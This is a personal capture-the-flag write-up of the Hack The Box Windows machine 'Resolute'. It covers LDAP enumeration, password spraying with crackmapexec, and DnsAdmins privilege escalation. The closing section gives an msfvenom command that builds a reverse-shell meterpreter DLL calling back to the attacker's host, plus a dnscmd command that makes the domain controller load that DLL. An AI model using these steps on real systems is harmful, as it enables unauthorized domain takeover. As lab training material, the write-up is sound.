# Resolute
Details:
- Resolute IP: 10.10.10.169
- Kali IP: 10.10.14.145
- Difficulty: medium
- Date of writeup: 30 May 2020

Resolute, my first Windows box. It was much harder for me than the average medium difficulty Linux box. Even though I had some knowledge on ldap, smb and active directory, which turned out to be handy, I couldn't finish it without a brief hunt for tips.

Sections:
- [Recon](#recon)
- [Obtaining a Foothold](#obtaining-a-foothold)
- [Lateral Movement](#lateral-movement)
- [Getting to Root](#getting-to-root)
- [Learnings from ippsec walkthrough](#learnings-from-ippsec-walkthrough)

Tools/commands Used
- nmap
- evil-winrm
- crackmapexec
- ldapsearch
- Bloodhound
- msfconsole
- msfvenom

## Recon
So, first things first: recon (```-v``` option shows ports as it founds them, so we can start working on them right away)
```shell
kali$  nmap -v -sC -sV 10.10.10.169
```

![](images/Resolute_2.png?raw=true)

There are many things to try out, given the ports that are open: DNS (53), Kerberos (88), LDAP (289), SMB (445) and so on. I started with LDAP.

## Obtaining a Foothold

```shell
kali$  ldapsearch -h 10.10.10.169 -x -s base namingcontexts
```

With the command above we can extract part of the FQDN (Fully Qualified Domain Name). We want to know the Domain Controller's name, to use it with the ```ldapsearch``` command (we actually also get the Domain name in the nmap run).

```shell
kali$  ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local"
```

This command spits out a bunch of information. I saved it in a file and started going through it. What we would really like to know is if there is any information regarding the users. We know, from an extended nmap scan (```nmap -p- 10.10.10.169```), that port 5985 is open, so we can use ```evil-winrm``` to log in.

Sure enough, after a bit of search, we found out that upon creation, users are given a default password.

![](images/Resolute_3.png?raw=true)

We now need to know whether some of the users forgot to change that password or not. We can do this in two ways:
- Extract the users from the LDAP dump by searching for the field ```sAMAccountName``` and attempt the password for all of them, or
- Look at information in the LDAP dump, fields like ```badPasswordTime```, ```lastLogonTimestamp```, ```pwdLastSet```, etc., and try to make inferences as to which user might have not changed their default password

Since there are only 60-something users in the system and there is no password lockout (see image below), then we can proceed to use ```crackmapexec```

![](images/Resolute_1.png?raw=true)

```shell
kali$  crackmapexec smb 10.10.10.169 -u users.txt -p passwords.txt
```

Sure enough, we get that user ```melanie``` didn't change her default password. We can now establish a connection:

![](images/Resolute_4.png?raw=true)


## Lateral movement

Achieving root was quite difficult in this box. It was quite a challenge and also I feel it was quite a "real-life"-like scenario. I attempted a bunch of things that didn't work out because of several reasons, and I ended up looking for tips in Reddit. The reason why many of the things I tried didn't work was because there seemed to be some security software running, as can be observed in the image below, where I tried to run PowerView.

![](images/Resolute_5.png?raw=true)

I also ran many enumeration scripts and Bloodhound, which turned out to be useful later on. To use it:
- Install [neo4j](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/#debian-install)
- Pull [Sharphound ingestors](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) from github
- Copy ingestor to the target, run it and obtain the Zip file back in your Kali VM
- Startup neo4j
- Get a [Bloodhound release](https://github.com/BloodHoundAD/BloodHound/releases) to start up the server
- Change chrome-sandbox permissions/owner as needed
- Import the zip file in Bloodhound

![](images/Resolute_10.png?raw=true)

I have to admit that not being very profficient in the use of Bloodhound, at first I was overwhelmed with the amount of information and followed a bunch of rabbit holes. My attempt to run PowerView above was one of those. I'm not goint into details here on how to use Bloodhound, as I'm sure there are many good resources out there to look at.

What I should have seen, however, was that there was another user that could remote into the Domain Controller. This should have been an interesting clue for me.

Anyhow, what I ended up doing was going through the filesystem searching for clues. There was an interesting folder in the C:\ folder:

![](images/Resolute_6.png?raw=true)

Getting the content of that file:

![](images/Resolute_7.png?raw=true)

We have the credentials to user ```ryan```, which is the user that I missed in the Bloodhound analysis.

![](images/Resolute_8.png?raw=true)


## Getting to root

We're still not there yet. This box seems to never end!

User ```ryan``` has a singularity, and it is that it belongs to the group DNSADMINS. I realized that while looking at the Bloodhound analysis, but since then I have not been able to reproduce the same query that I did to find it out. Anyways, any good enumeration script would have told me the same. 

After a bit of browsing around (just look for "DNSAdmin privilege escalation" and there'll be a bunch of results) I knew [what to do](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83). It seems that you can tell the DNS server to load an arbitrary DLL and run it. You can even use an UNC path, which is what I use in the following image

![](images/Resolute_9.png?raw=true)

Explanation:
- First, build a dll which will open a reverse shell to your kali VM:
```shell
kali$  msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.145 LPORT=4444 -f dll > smb_srv/privesc.dll
```
- Open msfconsole and start the handler for the reverse shell
- In the target machine, run the command that will load the dll
```shell
resolute$  dnscmd Resolute.megabank.local /config /serverlevelplugindll \\10.10.14.145\smb_srv\privesc.dll
```
- In the target machine, use ```sc.exe``` to stop/start the DNS server, making it load the DLL

**We have root!**


## Learnings from [ippsec walkthrough](https://www.youtube.com/watch?v=8KJebvmd1Fk)

TODO

